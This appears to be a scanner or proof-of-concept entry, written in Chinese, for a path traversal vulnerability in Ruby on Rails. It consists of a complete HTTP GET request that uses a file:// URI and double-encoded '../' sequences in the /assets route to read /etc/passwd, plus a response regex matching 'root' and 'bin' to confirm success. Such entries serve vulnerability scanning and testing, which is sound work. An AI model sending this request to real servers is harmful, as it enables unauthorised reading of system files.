# RubyOnRails路径穿越漏洞

RubyOnRails ｜ 路径遍历 ｜ —
- **请求**：`GET /assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$